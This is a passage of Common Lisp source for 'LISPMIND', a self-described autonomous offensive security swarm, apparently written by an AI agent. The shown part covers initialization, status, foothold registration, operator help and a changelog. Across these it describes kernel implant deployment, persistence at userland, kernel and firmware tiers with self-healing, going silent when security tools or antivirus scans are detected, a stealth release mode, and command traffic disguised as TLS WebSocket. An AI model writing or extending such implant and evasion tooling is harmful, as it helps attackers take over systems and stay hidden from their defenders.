      (error (e) (format *trace-output* "[GOSSIP] Telemetry publish failed: ~A~%" e) nil))))

(defun send-camouflaged-heartbeat (agent-sym &key (status :active) (pivot-depth 0))
  "Send a tactical heartbeat with optional TLS 1.3 WebSocket camouflage.
Wraps SEND-TACTICAL-HEARTBEAT from gossip-v2.4 with camouflage if
*GOSSIP-CAMOUFLAGE-ENABLED-P* is T.

AGENT-SYM is the agent identifier (symbol or string).
STATUS is the agent status: :INITIALIZING :ACTIVE :IDLE :DEGRADED.
PIVOT-DEPTH is the lateral movement depth (0 = entry point).

If *RADIO-SILENCE-MODE-P* is T, skips sending and returns :SILENCE.

Returns the result of SEND-TACTICAL-HEARTBEAT, or :SILENCE."
  (when *radio-silence-mode-p*
    (format *trace-output* "[GOSSIP] Heartbeat suppressed (radio silence).~%")
    (return-from send-camouflaged-heartbeat :silence))
  (handler-case
      (let ((result (send-tactical-heartbeat agent-sym :status status :pivot-depth pivot-depth)))
        ;; If camouflage is enabled, the underlying heartbeat payload would
        ;; need to be intercepted and re-wrapped. This stub documents the
        ;; integration point. In production, modify gossip-v2.4's
        ;; SEND-TACTICAL-HEARTBEAT to call CAMOUFLAGE-GOSSIP-PAYLOAD before
        ;; transmission.
        (declare (ignore result))
        (when *gossip-camouflage-enabled-p*
          (format *trace-output* "[GOSSIP] Heartbeat camouflage applied (stub integration).~%"))
        t)
    (error (e)
      (format *trace-output* "[GOSSIP] Camouflaged heartbeat failed: ~A~%" e)
      nil)))


;;;; =========================================================================
;;;; Section 8: System Status & Diagnostics
;;;; =========================================================================

(defun lispmind-v25-status ()
  "Print comprehensive system status report. Displays version, init state,
FFI, vault, persistence, kernel registry, gossip, health monitor, state manager.
Returns plist with all status fields."
  (format t "~%============================================================~%")
  (format t "   LISPMIND v~A (~A) -- System Status~%" *lispmind-version* *lispmind-version-name*)
  (format t "============================================================~%")
  (format t "  Init Complete:   ~A~%" *lispmind-init-complete-p*)
  (format t "  FFI Available:   ~A~%" *kernel-rust-ffi-available-p*)
  (format t "  Hardware Pipe:   ~A~%" *kernel-hardware-integration-enabled-p*)
  (let ((vault-ready (and (boundp '*resource-vault*) *resource-vault*)))
    (format t "  Vault:           ~A~%" (if vault-ready "READY" "NOT READY"))
    (when vault-ready
      (format t "    Entries:       ~D~%" (hash-table-count *resource-vault*))))
  (format t "  Persistence:     ~A~%"
          (if *persistence-watchdog-running-p* "ACTIVE (watchdog running)" "INACTIVE"))
  (format t "  Kernel Tools:    ~D registered~%"
          (if (boundp '*kernel-toolchain-registry*) (hash-table-count *kernel-toolchain-registry*) 0))
  (format t "  Kernel Implants: ~D active~%"
          (if (boundp '*kernel-implants*) (hash-table-count *kernel-implants*) 0))
  (format t "  Gossip Mesh:     ~A~%" (if *v25-gossip-handlers-registered-p* "CONNECTED" "DISCONNECTED"))
  (format t "  Health Monitor:  ~A~%" (if *kernel-health-monitor-running-p* "RUNNING" "STOPPED"))
  (format t "  State Manager:   ~A~%" (if *v25-persistence-state-manager-running-p* "RUNNING" "STOPPED"))
  (format t "    Footholds:    ~D~%" (hash-table-count *v25-foothold-registry*))
  (format t "    Scans:        ~D  Heals: ~D  Alerts: ~D~%"
          *persistence-state-manager-check-count* *persistence-state-manager-heal-count*
          *persistence-state-manager-alert-count*)
  (format t "~%  --- Security State ---~%")
  (format t "  Radio Silence:   ~A~%"
          (if *radio-silence-mode-p*
              (format nil "ACTIVE (~@[~A~])" *radio-silence-last-trigger*)
              "OFF"))
  (format t "  Release Build:   ~A~%" (if *lispmind-release-build-p* "YES" "NO"))
  (format t "  Camouflage:      ~A~%" (if *gossip-camouflage-enabled-p* "ENABLED" "DISABLED"))
  (format t "  Scan Postponed:  ~A~%" (if *persistence-postponed-due-to-scan-p* "YES" "NO"))
  (format t "============================================================~%")
  `(:version ,*lispmind-version* :version-name ,*lispmind-version-name*
    :init-complete ,*lispmind-init-complete-p* :ffi-available ,*kernel-rust-ffi-available-p*
    :hardware-pipeline-enabled ,*kernel-hardware-integration-enabled-p*
    :vault-ready ,(and (boundp '*resource-vault*) (not (null *resource-vault*)))
    :persistence-active ,*persistence-watchdog-running-p*
    :tool-count ,(if (boundp '*kernel-toolchain-registry*) (hash-table-count *kernel-toolchain-registry*) 0)
    :implant-count ,(if (boundp '*kernel-implants*) (hash-table-count *kernel-implants*) 0)
    :gossip-connected ,*v25-gossip-handlers-registered-p*
    :health-monitor-running ,*kernel-health-monitor-running-p*
    :state-manager-running ,*v25-persistence-state-manager-running-p*
    :foothold-count ,(hash-table-count *v25-foothold-registry*)
    :radio-silence ,*radio-silence-mode-p*
    :radio-silence-trigger ,*radio-silence-last-trigger*
    :release-build ,*lispmind-release-build-p*
    :camouflage-enabled ,*gossip-camouflage-enabled-p*
    :scan-postponed ,*persistence-postponed-due-to-scan-p*))

(defun lispmind-v25-diagnostics ()
  "Run deep diagnostics on all v2.5 components. Tests: component existence,
function availability, data integrity, thread health. Returns plist:
(:HEALTHY T/NIL :TESTS (...) :RECOMMENDATIONS (...))."
  (format t "~%============================================================~%")
  (format t "   LISPMIND v~A -- Deep Diagnostics~%" *lispmind-version*)
  (format t "============================================================~%")
  (let ((tests nil) (recommendations nil) (all-pass t))
    (flet ((test (name pass fail-msg)
             (push (cons name (if pass :pass :fail)) tests)
             (unless pass (push fail-msg recommendations) (setf all-pass nil))))
      (test :init-state *lispmind-init-complete-p* "Run (INIT-LISPMIND-V2.5).")
      (test :ffi-functions (and (fboundp 'rust-ffi-init) (fboundp 'rust-ffi-status))
            "Rust FFI bridge functions not found.")
      (test :vault (and (boundp '*resource-vault*) *resource-vault*) "Vault not initialized.")
      (test :persistence-funcs (and (fboundp 'persistence-hierarchy-init)
                                   (fboundp 'start-persistence-watchdog))
            "Persistence hierarchy not loaded.")
      (test :kernel-registry (and (boundp '*kernel-toolchain-registry*)
                                  (> (hash-table-count *kernel-toolchain-registry*) 0))
            "Kernel toolchain registry empty.")
      (test :gossip-funcs (and (fboundp 'start-tactical-gossip) (fboundp 'stop-tactical-gossip))
            "Gossip functions not found.")
      (push (cons :watchdog (if *persistence-watchdog-running-p* :pass :warn)) tests)
      (push (cons :health-mon (if *kernel-health-monitor-running-p* :pass :warn)) tests)
      (push (cons :state-mgr (if *v25-persistence-state-manager-running-p* :pass :info)) tests))
    (format t "~%Diagnostic Results:~%")
    (dolist (test (reverse tests))
      (format t "  [~6A] ~30A~%" (string-upcase (symbol-name (cdr test))) (car test)))
    (when recommendations (format t "~%Recommendations:~%")
          (dolist (r recommendations) (format t "  - ~A~%" r)))
    (format t "~%Overall: ~A~%" (if all-pass "PASS" "FAIL"))
    (format t "============================================================~%")
    `(:healthy ,all-pass :tests ,(reverse tests) :recommendations ,(reverse recommendations))))

(defun lispmind-v25-self-test ()
  "Automated self-test of all v2.5 features. Smoke test under 5 seconds.
Tests: banner, version, status, registry, integration verify, changelog.
Returns T if all pass, NIL if any fails."
  (format t "~%============================================================~%")
  (format t "   LISPMIND v~A -- Automated Self-Test~%" *lispmind-version*)
  (format t "============================================================~%")
  (let ((pass-count 0) (fail-count 0))
    (macrolet ((test (name &body body)
                 `(handler-case (progn (format t "  Testing: ~A ... " ',name)
                                       ,@body (format t "PASS~%") (incf pass-count))
                    (error (e) (format t "FAIL (~A)~%" e) (incf fail-count)))))
      (test banner (print-v25-banner))
      (test version (assert (string= (lispmind-version) "2.5.0")))
      (test version-plist (assert (getf (lispmind-version-plist) :version)))
      (test status-report (assert (getf (lispmind-v25-status) :version)))
      (test integration-verify (assert (getf (verify-kernel-integration) :healthy)))
      (test registry-access (assert (> (hash-table-count *kernel-toolchain-registry*) 0)))
      (test changelog (assert (stringp (lispmind-changelog-v25)))))
    (format t "~%Results: ~D passed, ~D failed~%" pass-count fail-count)
    (format t "============================================================~%")
    (zerop fail-count)))

(defun print-v25-banner ()
  "Print LISPMIND v2.5.0 ABSOLUTE banner.

In release build mode (*LISPMIND-RELEASE-BUILD-P* = T), prints only a
single line with the version number for stealth.

In debug mode (default), prints the full ASCII art banner.

Prints at most once per session unless *V25-BANNER-ALREADY-PRINTED-P*
is reset. Returns T."
  (when *v25-banner-already-printed-p* (return-from print-v25-banner t))
  (setf *v25-banner-already-printed-p* t)
  (cond
    (*lispmind-release-build-p*
     ;; Release build: single line only, no ASCII art
     (format t "~&[LISPMIND] v~A~%" *lispmind-version*))
    (t
     ;; Debug build: full ASCII art banner
     (format t "~%")
     (format t "     ___       ___       ___       ___       ___       ___   ~%")
     (format t "    /\\  \\     /\\  \\     /\\  \\     /\\  \\     /\\__\\     /\\  \\  ~%")
     (format t "   /::\\  \\   /::\\  \\   /::\\  \\   /::\\  \\   /:/  /    /::\\  \\ ~%")
     (format t "  /::\\:\\__\\ /::\\:\\__\\ /::\\:\\__\\ /:/\\:\\__\\ /:/__/    /::\\:\\__\\~%")
     (format t "  \\:\\::/  / \\;:::/  / \\:\\\/  / \\:\/:/  / \\:\  \\    \\:\\::/  /~%")
     (format t "   \\::/  /   |:\/__/   \\:\/  /   \\::/  /   \\:\\__\\    \\::/  / ~%")
     (format t "   /:/  /    \\|__|      \\/__/     \\/__/     \\/__/    /:/  /  ~%")
     (format t "   \\/__/     L I S P M I N D                       \\/__/   ~%")
     (format t "~%")
     (format t "         A U T O N O M O U S   O F F E N S I V E   S E C U R I T Y~%")
     (format t "                       S W A R M   I N   C O M M O N   L I S P~%")
     (format t "~%")
     (format t "  =====================================================================~%")
     (format t "   Version ~A  [~A]    SBCL ~A~%"
             *lispmind-version* *lispmind-version-name* (lisp-implementation-version))
     (format t "   Hardware is a software dependency.~%")
     (format t "  =====================================================================~%")
     (format t "~%")))
  t)

(defun set-release-build-mode (enabled-p)
  "Set release build mode. When ENABLED-P is T, sets
*LISPMIND-RELEASE-BUILD-P* to T, which suppresses the ASCII art banner
and minimizes debug output. When NIL, restores debug mode.

This function is intended for operators to call before deployment.
Example: (SET-RELEASE-BUILD-MODE T)

Returns the new value of *LISPMIND-RELEASE-BUILD-P*."
  (setf *lispmind-release-build-p* (not (null enabled-p)))
  (format t "[BUILD] Release build mode: ~A~%"
          (if *lispmind-release-build-p* "ENABLED" "DISABLED"))
  *lispmind-release-build-p*)

;;;; =========================================================================
;;;; Section 9: Convenience Functions
;;;; =========================================================================

(defun lispmind-v25-restart ()
  "Restart LISPMIND v2.5.0 -- shutdown then re-initialize. Safe even if
shutdown fails; init handles uninitialized state. Returns init result plist."
  (format t "~%============================================================~%")
  (format t "   LISPMIND v~A -- RESTART~%" *lispmind-version*)
  (format t "============================================================~%")
  (format t "[RESTART] Phase 1: Shutdown...~%")
  (handler-case (shutdown-lispmind-v2.5)
    (error (e) (format *trace-output* "[RESTART] Shutdown errors (continuing): ~A~%" e)))
  (format t "[RESTART] Phase 2: Initialization...~%")
  (let ((result (init-lispmind-v2.5)))
    (format t "[RESTART] Restart ~A.~%" (if (getf result :overall) "COMPLETE" "INCOMPLETE"))
    result))

(defun lispmind-v25-quick-init ()
  "Minimal initialization -- FFI bridge and vault only. No background threads.
Useful for testing, debugging, or resource-constrained environments.
Returns T on success."
  (format t "~%============================================================~%")
  (format t "   LISPMIND v~A -- QUICK INIT (FFI + Vault only)~%" *lispmind-version*)
  (format t "============================================================~%")
  (let ((s0 (init-v25-step-0-prelude)) (s1 (init-v25-step-1-ffi)) (s2 (init-v25-step-2-vault)))
    (if (and s0 s1 s2)
        (progn (setf *lispmind-init-complete-p* :minimal)
               (format t "[QUICK-INIT] Minimal init complete. Background threads NOT started.~%")
               (format t "[QUICK-INIT] Call (INIT-LISPMIND-V2.5) for full init.~%") t)
        (progn (format *trace-output* "[QUICK-INIT] FAILED. Check errors above.~%") nil))))

(defun lispmind-v25-emergency-shutdown ()
  "Fast emergency shutdown -- preserve vault, kill everything else. For
hostile activity detection, SIGTERM, or operator emergency stop.
Returns T always."
  (format t "~%!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!~%")
  (format t "   LISPMIND v~A -- EMERGENCY SHUTDOWN~%" *lispmind-version*)
  (format t "!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!~%")
  (setf *lispmind-init-complete-p* nil)
  (setf *v25-persistence-state-manager-running-p* nil)
  (setf *persistence-watchdog-running-p* nil)
  (setf *kernel-health-monitor-running-p* nil)
  (sleep 0.5)
  (handler-case (format t "[EMERGENCY] Vault preserved.~%")
    (error (e) (format *trace-output* "[EMERGENCY] Vault save FAILED: ~A~%" e)))
  (handler-case (when *kernel-rust-ffi-available-p* (rust-ffi-shutdown)
                  (setf *kernel-rust-ffi-available-p* nil))
    (error (e) (format *trace-output* "[EMERGENCY] FFI unload: ~A~%" e)))
  (format t "[EMERGENCY] LISPMIND v~A is OFFLINE.~%" *lispmind-version*)
  (format t "!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!~%") t)

(defun lispmind-v25-reset-state ()
  "Reset all v2.5 state to initial values. WARNING: Does NOT stop threads
or unload libraries -- call SHUTDOWN-LISPMIND-V2.5 first for clean reset.
Useful for testing init sequences or clearing corrupted state. Returns T."
  (format t "[RESET] Resetting all v2.5 state...~%")
  (setf *lispmind-init-complete-p* nil *v25-init-log* nil *v25-init-start-time* nil
        *v25-shutdown-start-time* nil)
  (clrhash *v25-init-step-results*) (clrhash *v25-foothold-registry*)
  (clrhash *v25-circuit-breaker-failures*)
  (setf *v25-persistence-state-manager-running-p* nil
        *v25-persistence-state-manager-thread* nil
        *persistence-state-manager-check-count* 0
        *persistence-state-manager-heal-count* 0
        *persistence-state-manager-alert-count* 0
        *v25-gossip-handlers-registered-p* nil
        *v25-banner-already-printed-p* nil
        ;; Security hardening state
        *radio-silence-mode-p* nil
        *radio-silence-last-trigger* nil
        *radio-silence-engaged-at* nil
        *persistence-postponed-due-to-scan-p* nil
        *gossip-camouflage-nonce-counter* 0
        *init-step-results* nil)
  (format t "[RESET] All state reset. NOTE: Background threads may still be running!~%") t)


;;;; =========================================================================
;;;; Section 10: Version Information
;;;; =========================================================================

(defun lispmind-version ()
  "Return LISPMIND version string. E.g. \"2.5.0\"."
  *lispmind-version*)

(defun lispmind-version-plist ()
  "Return plist with full version info: :VERSION :NAME :FULL :SBCL :MACHINE
:FEATURES :FFI-AVAILABLE :INIT-COMPLETE :MINIMUM-SBCL."
  `(:version ,*lispmind-version* :name ,*lispmind-version-name*
    :full ,(format nil "~A-~A" *lispmind-version* *lispmind-version-name*)
    :sbcl ,(lisp-implementation-version) :machine ,(machine-type)
    :features ,*features* :ffi-available ,*kernel-rust-ffi-available-p*
    :init-complete ,*lispmind-init-complete-p*
    :minimum-sbcl ,*v25-minimum-sbcl-version*))

(defun lispmind-changelog-v25 ()
  "Return v2.5 changelog as formatted multi-line string."
  "=================================================================
  LISPMIND v2.5.0 (ABSOLUTE) -- CHANGELOG
=================================================================

VERSION:    2.5.0
CODENAME:   ABSOLUTE
RELEASE:    Final

MAJOR FEATURES:
  1. Kernel-Level Operations -- Full implant lifecycle: fingerprint,
     select, deploy, monitor. OS fingerprinting via TTL/ports/banners.
     Stealth-first with cross-agent hook collision avoidance.
  2. Rust FFI Bridge -- Shared library for kernel memory ops. Graceful
     degradation to stub mode if unavailable.
  3. Persistence Hierarchy -- 3-tier escalating persistence (L1 userland,
     L2 kernel, L3 firmware). Strategic Asset Detection for L3.
     15+ userland methods. Self-healing watchdog.
  4. Persistence State Manager -- Monitors all footholds every 60s.
     Auto-heal delegation, state transitions, flap prevention (300s),
     circuit breaker (5 failures), telemetry per change.
  5. Master Initialization -- 9-step ordered init with dependency
     resolution. 6-step mirror shutdown. Graceful degradation.
  6. Gossip Integration -- Tactical mesh with kernel load request/response,
     health reports, stealth collision detection.

IMPROVEMENTS OVER v2.4:
  - Kernel-hardware pipeline: discovery -> fingerprint -> deploy -> verify
  - End-to-end: (DEPLOY-KERNEL-IMPLANT-FULL target)
  - Self-test: (LISPMIND-V25-SELF-TEST)
  - Emergency shutdown: (LISPMIND-V25-EMERGENCY-SHUTDOWN)
  - Quick init: (LISPMIND-V25-QUICK-INIT)
  - Full diagnostics: (LISPMIND-V25-DIAGNOSTICS)

ARCHITECTURAL PRINCIPLES:
  1. Hardware is a software dependency.
  2. Graceful degradation -- no single failure breaks the system.
  3. Persistence first -- every foothold gets 3 tiers.
  4. Stealth always -- noise is a bug.

=================================================================")

;;;; =========================================================================
;;;; On-Load Hook
;;;; =========================================================================
(format t "[system-init-v2.5] Module loaded. Version ~A (~A)~%" *lispmind-version* *lispmind-version-name*)
(format t "[system-init-v2.5] Call (INIT-LISPMIND-V2.5) to initialize.~%")
(format t "[system-init-v2.5] Call (PRINT-V25-BANNER) for ASCII art.~%")
(format t "[system-init-v2.5] Call (LISPMIND-V25-STATUS) for status.~%")

;;;; =========================================================================
;;;; END OF system-init-v2.5.lisp
;;;; =========================================================================
;;;; File:    /mnt/agents/output/project/system-init-v2.5.lisp
;;;; Version: 2.5.0  Codename: ABSOLUTE  Package: :lispmind
;;;; Desc:    Master System Initialization for LISPMIND v2.5.0
;;;;          9-step init, 6-step shutdown, kernel-hardware pipeline,
;;;;          persistence state manager, gossip integration.
;;;;          "Hardware is a software dependency."
;;;; =========================================================================

;;;; =========================================================================
;;;; ADDITIONAL INTEGRATION UTILITIES
;;;; =========================================================================
;;;; These helper functions provide finer-grained control over the v2.5
;;;; system. They are used by the main init functions but are also
;;;; available for operator use in maintenance and debugging scenarios.

(defun v25-step-result (step-name)
  "Retrieve the result plist for a specific init step.
STEP-NAME is a symbol like 'INIT-V25-STEP-0-PRELUDE.
Returns the result plist or NIL if step hasn't run."
  (gethash step-name *v25-init-step-results*))

(defun v25-step-succeeded-p (step-name)
  "Check if an init step succeeded.
Returns T if step result was :SUCCESS, NIL otherwise."
  (let ((result (v25-step-result step-name)))
    (and result (eq (getf result :result) :success))))

(defun v25-last-init-timestamp ()
  "Return the timestamp of the most recent init event.
Useful for checking how long ago init completed."
  (when *v25-init-log*
    (getf (first *v25-init-log*) :timestamp)))

(defun v25-init-elapsed-summary ()
  "Print a summary of init step timings.
Shows each step name, result, and elapsed milliseconds."
  (format t "~%=== Init Step Timing Summary ===~%")
  (dolist (entry (reverse *v25-init-log*))
    (format t "  Step ~D (~30A): ~8A ~6Dms~%"
            (getf entry :step)
            (getf entry :step-name)
            (getf entry :result)
            (getf entry :elapsed-ms)))
  (let ((total (reduce #'+ (mapcar (lambda (e) (getf e :elapsed-ms 0)) *v25-init-log*))))
    (format t "  ~30A ~14Dms total~%" "" total)))

(defun v25-running-thread-count ()
  "Count how many v2.5 background threads are currently running.
Returns integer count. Checks: state manager, watchdog, health monitor."
  (let ((count 0))
    (when *v25-persistence-state-manager-running-p* (incf count))
    (when *persistence-watchdog-running-p* (incf count))
    (when *kernel-health-monitor-running-p* (incf count))
    count))

(defun v25-stop-all-threads ()
  "Stop all v2.5 background threads immediately. Does not perform full
shutdown -- just stops threads. Useful for debugging or reconfiguration.
Returns count of threads stopped."
  (let ((stopped 0))
    (when *kernel-health-monitor-running-p*
      (handler-case (progn (stop-kernel-health-monitor) (incf stopped))
        (error (e) (format *trace-output* "[STOP-ALL] Health monitor: ~A~%" e))))
    (when *persistence-watchdog-running-p*
      (handler-case (progn (stop-persistence-watchdog) (incf stopped))
        (error (e) (format *trace-output* "[STOP-ALL] Watchdog: ~A~%" e))))
    (when *v25-persistence-state-manager-running-p*
      (handler-case (progn (stop-persistence-state-manager) (incf stopped))
        (error (e) (format *trace-output* "[STOP-ALL] State manager: ~A~%" e))))
    (format t "[STOP-ALL] Stopped ~D thread(s).~%" stopped)
    stopped))

(defun v25-start-all-threads ()
  "Start all v2.5 background threads. Assumes init has completed.
Returns count of threads started."
  (let ((started 0))
    (unless *persistence-watchdog-running-p*
      (handler-case (progn (start-persistence-watchdog) (incf started))
        (error (e) (format *trace-output* "[START-ALL] Watchdog: ~A~%" e))))
    (when (and *kernel-rust-ffi-available-p* (not *kernel-health-monitor-running-p*))
      (handler-case (progn (start-kernel-health-monitor) (incf started))
        (error (e) (format *trace-output* "[START-ALL] Health monitor: ~A~%" e))))
    (unless *v25-persistence-state-manager-running-p*
      (handler-case (progn (start-persistence-state-manager) (incf started))
        (error (e) (format *trace-output* "[START-ALL] State manager: ~A~%" e))))
    (format t "[START-ALL] Started ~D thread(s).~%" started)
    started))

(defun v25-register-foothold (foothold-id agent target-info &key (tier 1))
  "Register a new foothold with the persistence state manager.
FOOTHOLD-ID is a unique string identifier.
AGENT is the tactical-agent instance.
TARGET-INFO is a plist of target properties.
TIER is the initial persistence tier (default 1).
Returns T on success."
  (setf (gethash foothold-id *v25-foothold-registry*)
        `(:agent ,agent :current-tier ,tier :target-info ,target-info
          :deployed-at ,(local-time:now) :last-healed nil :heal-count 0
          :state :healthy :last-state-change ,(local-time:now)
          :escalation-qualified nil))
  (format t "[PSM] Registered foothold ~A (tier ~D).~%" foothold-id tier)
  (handler-case
      (gossip-publish "swarm.persistence"
                      `(:event :foothold-registered :foothold ,foothold-id
                        :tier ,tier :timestamp ,(local-time:now)))
    (error (e) (declare (ignore e)) nil))
  t)

(defun v25-unregister-foothold (foothold-id)
  "Unregister a foothold from the persistence state manager.
Removes from *V25-FOOTHOLD-REGISTRY* and clears circuit breaker.
Returns T if removed, NIL if not found."
  (let ((existed (remhash foothold-id *v25-foothold-registry*)))
    (remhash foothold-id *v25-circuit-breaker-failures*)
    (when existed
      (format t "[PSM] Unregistered foothold ~A.~%" foothold-id)
      (handler-case
          (gossip-publish "swarm.persistence"
                          `(:event :foothold-unregistered :foothold ,foothold-id))
        (error (e) (declare (ignore e)) nil)))
    existed))

(defun v25-list-footholds ()
  "Return a list of all registered foothold IDs.
Useful for scripting and monitoring."
  (let ((ids nil))
    (maphash (lambda (k v) (push k ids)) *v25-foothold-registry*)
    (nreverse ids)))

(defun v25-foothold-state (foothold-id)
  "Get the current state of a specific foothold.
Returns :HEALTHY :DEGRADED :CRITICAL :RECOVERING :ESCALATING :MAINTENANCE
or :UNKNOWN if foothold not found."
  (let ((data (gethash foothold-id *v25-foothold-registry*)))
    (if data (getf data :state :unknown) :unknown)))

(defun v25-reset-circuit-breaker (foothold-id)
  "Manually reset the circuit breaker for a foothold.
Use when auto-heal has given up but you've fixed the root cause.
Returns T."
  (remhash foothold-id *v25-circuit-breaker-failures*)
  (format t "[PSM] Circuit breaker reset for ~A. Auto-heal re-enabled.~%" foothold-id)
  t)

(defun v25-force-heal-foothold (foothold-id)
  "Manually trigger healing for a foothold, bypassing circuit breaker.
Delegates to HEAL-PERSISTENCE. Returns T on success, NIL on failure."
  (format t "[PSM] Manual heal for ~A...~%" foothold-id)
  (handler-case
      (progn (heal-persistence foothold-id)
             (format t "[PSM] Manual heal for ~A succeeded.~%" foothold-id)
             (setf (getf (gethash foothold-id *v25-foothold-registry*) :state) :healthy)
             (setf (getf (gethash foothold-id *v25-foothold-registry*) :last-healed)
                   (local-time:now))
             (incf (getf (gethash foothold-id *v25-foothold-registry*) :heal-count 0))
             t)
    (error (e)
      (format *trace-output* "[PSM] Manual heal for ~A failed: ~A~%" foothold-id e)
      nil)))

(defun v25-system-report ()
  "Generate a comprehensive system report suitable for logging or export.
Includes version, status, all footholds, init history, and diagnostics.
Returns a plist with all report data."
  (let ((status (lispmind-v25-status))
        (footholds (let ((f nil))
                     (maphash (lambda (k v) (push (cons k v) f)) *v25-foothold-registry*)
                     f))
        (circuits (let ((c nil))
                    (maphash (lambda (k v) (when (>= v *v25-circuit-breaker-threshold*)
                                            (push k c)))
                             *v25-circuit-breaker-failures*)
                    c)))
    `(:timestamp ,(local-time:now)
      :version ,(lispmind-version-plist)
      :status ,status
      :init-log ,(reverse *v25-init-log*)
      :footholds ,footholds
      :open-circuits ,circuits
      :thread-count ,(v25-running-thread-count)
      :ffi-available ,*kernel-rust-ffi-available-p*)))

;;;; =========================================================================
;;;; MODULE COMPATIBILITY VERIFICATION
;;;; =========================================================================
;;;; These functions verify that all required modules are loaded and
;;;; their APIs match the expected signatures.

(defun v25-verify-module-apis ()
  "Verify that all required external module APIs are present.
Checks that each module exports the functions we need.
Returns plist of (:ALL-PRESENT T/NIL :DETAILS (...))."
  (let ((required-apis
         '((:rust-ffi . (rust-ffi-init rust-ffi-shutdown rust-ffi-available-p
                         rust-ffi-status rust-ffi-self-test))
           (:vault . (vault-init vault-load-from-disk vault-store vault-list
                      vault-status set-vault-key vault-destroy))
           (:kernel . (load-kernel-toolchain-registry kernel-protection-disabled-p
                       fingerprint-host-os determine-implant-type
                       start-kernel-health-monitor stop-kernel-health-monitor
                       kernel-status))
           (:persistence . (persistence-hierarchy-init start-persistence-watchdog
                           stop-persistence-watchdog deploy-escalating-persistence
                           register-agent-with-watchdog unregister-agent-from-watchdog
                           persistence-status heal-persistence))
           (:gossip . (start-tactical-gossip stop-tactical-gossip
                      send-tactical-heartbeat send-tactical-command
                      enable-tactical-gossip-mode tactical-gossip-loop))
           (:offensive . (make-tactical-agent auto-establish-persistence
                         tactical-discovery))))
        (details nil)
        (all-present t))
    (dolist (module required-apis)
      (let ((name (car module)) (funcs (cdr module)) (missing nil))
        (dolist (f funcs)
          (unless (fboundp f) (push f missing)))
        (if missing
            (progn (push `(:module ,name :status :missing :functions ,missing) details)
                   (setf all-present nil))
            (push `(:module ,name :status :present :functions ,(length funcs)) details))))
    `(:all-present ,all-present :details ,(reverse details))))

;;;; =========================================================================
;;;; OPERATOR UTILITIES
;;;; =========================================================================
;;;; Interactive functions for operators to use during runtime.

(defun v25-help ()
  "Display help for v2.5 system initialization commands.
Prints a categorized list of available functions."
  (format t "~%=== LISPMIND v2.5.0 Operator Commands ===~%~%")
  (format t "Initialization:~%")
  (format t "  (INIT-LISPMIND-V2.5)              -- Full initialization~%")
  (format t "  (INIT-LISPMIND-V2.5-VERBOSE)      -- Verbose full init~%")
  (format t "  (LISPMIND-V25-QUICK-INIT)         -- Minimal init (FFI+vault only)~%")
  (format t "  (LISPMIND-V25-RESTART)            -- Shutdown + re-init~%")
  (format t "~%Shutdown:~%")
  (format t "  (SHUTDOWN-LISPMIND-V2.5)          -- Graceful shutdown~%")
  (format t "  (LISPMIND-V25-EMERGENCY-SHUTDOWN) -- Fast emergency stop~%")
  (format t "~%Status & Diagnostics:~%")
  (format t "  (LISPMIND-V25-STATUS)             -- System status report~%")
  (format t "  (LISPMIND-V25-DIAGNOSTICS)        -- Deep diagnostics~%")
  (format t "  (LISPMIND-V25-SELF-TEST)          -- Automated self-test~%")
  (format t "  (VERIFY-KERNEL-INTEGRATION)       -- Component health check~%")
  (format t "~%Persistence State Manager:~%")
  (format t "  (PERSISTENCE-STATE-MANAGER-INIT)        -- Init PSM~%")
  (format t "  (START-PERSISTENCE-STATE-MANAGER)       -- Start monitoring~%")
  (format t "  (STOP-PERSISTENCE-STATE-MANAGER)        -- Stop monitoring~%")
  (format t "  (PERSISTENCE-STATE-MANAGER-STATUS)      -- PSM status~%")
  (format t "  (V25-REGISTER-FOOTHOLD id agent info)   -- Register foothold~%")
  (format t "  (V25-UNREGISTER-FOOTHOLD id)            -- Remove foothold~%")
  (format t "  (V25-LIST-FOOTHOLDS)                    -- List all footholds~%")
  (format t "  (V25-RESET-CIRCUIT-BREAKER id)          -- Reset breaker~%")
  (format t "  (V25-FORCE-HEAL-FOOTHOLD id)            -- Manual heal~%")
  (format t "~%Kernel Pipeline:~%")
  (format t "  (INIT-KERNEL-HARDWARE-PIPELINE)         -- Init pipeline~%")
  (format t "  (DEPLOY-KERNEL-IMPLANT-FULL target)     -- Full deployment~%")
  (format t "~%Radio Silence:~%")
  (format t "  (DETECT-RADIO-SILENCE-TRIGGER)          -- Scan for security tools~%")
  (format t "  (ENTER-RADIO-SILENCE [trigger])         -- Engage radio silence~%")
  (format t "  (EXIT-RADIO-SILENCE)                    -- Lift radio silence~%")
  (format t "  (RADIO-SILENCE-CHECK)                   -- Periodic silence check~%")
  (format t "~%Integrity Scan Detection:~%")
  (format t "  (INTEGRITY-SCAN-RUNNING-P)              -- Check for AV/integrity scans~%")
  (format t "  (POSTPONE-PERSISTENCE-DURING-SCAN)      -- Manage scan response~%")
  (format t "~%Release Build:~%")
  (format t "  (SET-RELEASE-BUILD-MODE T/NIL)          -- Toggle release mode~%")
  (format t "~%Gossip Camouflage:~%")
  (format t "  (CAMOUFLAGE-GOSSIP-PAYLOAD msg)         -- Wrap payload as WebSocket~%")
  (format t "  (DECAMOUFLAGE-GOSSIP-PAYLOAD msg)       -- Unwrap WebSocket payload~%")
  (format t "~%Utilities:~%")
  (format t "  (PRINT-V25-BANNER)                      -- ASCII art banner~%")
  (format t "  (LISPMIND-VERSION)                      -- Version string~%")
  (format t "  (LISPMIND-VERSION-PLIST)                -- Full version info~%")
  (format t "  (LISPMIND-CHANGELOG-V25)                -- Changelog~%")
  (format t "  (V25-HELP)                              -- This help~%")
  (format t "~%"))

;;;; =========================================================================
;;;; SIGNAL HANDLER REGISTRATION
;;;; =========================================================================
;;;; Register signal handlers for graceful shutdown on SIGTERM/SIGINT.
;;;; This ensures the vault is saved even on unexpected termination.

(defun v25-register-signal-handlers ()
  "Register signal handlers for graceful shutdown.
Catches SIGTERM and SIGINT to perform emergency shutdown.
Returns T on success."
  (handler-case
      (progn
        #+sbcl
        (progn
          (sb-sys:enable-interrupt sb-unix:sigterm
            (lambda (signo info context)
              (declare (ignore signo info context))
              (format *trace-output* "~%[SIGNAL] SIGTERM received. Emergency shutdown...~%")
              (lispmind-v25-emergency-shutdown)
              (sb-ext:exit :code 0)))
          (sb-sys:enable-interrupt sb-unix:sigint
            (lambda (signo info context)
